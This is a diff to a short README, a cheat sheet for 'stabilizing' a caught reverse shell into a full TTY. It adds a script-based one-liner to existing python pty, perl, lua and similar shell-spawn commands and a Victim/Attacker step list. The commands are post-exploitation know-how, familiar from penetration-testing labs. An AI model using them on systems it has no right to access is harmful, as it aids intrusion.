@@ -1,7 +1,9 @@
 # Reverse-Shell-TTY-Cheat-Sheet
 Simple TTY cheat sheet for shell stabilization
+Prevents you from nerving your reverse shells and adds proper shell functionality
 
 - Python
+- Script
 - Perl
 - Linux OS 
 - Ruby
@@ -11,6 +13,7 @@ Simple TTY cheat sheet for shell stabilization
 
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
+/usr/bin/script -qc /bin/bash /dev/null
 perl —e 'exec "/bin/sh";'
 perl: exec "/bin/sh";
 echo os.system('/bin/bash')
@@ -24,7 +27,7 @@ lua: os.execute('/bin/sh')
 ```
 Victim
 
-python -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import pty; pty.spawn("/bin/bash")' OR /usr/bin/script -qc /bin/bash /dev/null
 Control Z
 
 Attacker 
